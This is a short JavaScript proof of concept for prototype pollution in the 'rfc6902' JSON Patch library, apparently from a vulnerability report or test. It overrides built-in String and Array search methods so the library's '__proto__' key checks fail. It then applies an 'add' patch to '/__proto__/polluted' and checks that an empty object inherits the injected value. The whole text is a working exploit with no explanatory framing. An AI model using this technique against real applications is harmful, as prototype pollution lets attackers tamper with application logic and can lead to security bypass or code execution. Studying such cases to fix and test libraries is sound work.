String.prototype.includes = () => false;
String.prototype.startsWith = () => false;
String.prototype.endsWith = () => false;
String.prototype.indexOf = () => -1;
String.prototype.lastIndexOf = () => false;
String.prototype.match = () => false;
String.prototype.search = () => false;
String.prototype.matchAll = () => false;
Array.prototype.includes = () => false;
Array.prototype.indexOf = () => -1;
console.log({}.polluted);
var rfc6902 = require('rfc6902');
var obj = {};
rfc6902.applyPatch(obj, [{
        op: 'add',
        path: '/__proto__/polluted',
        value: 'yes'
    }]);
console.log({}.polluted);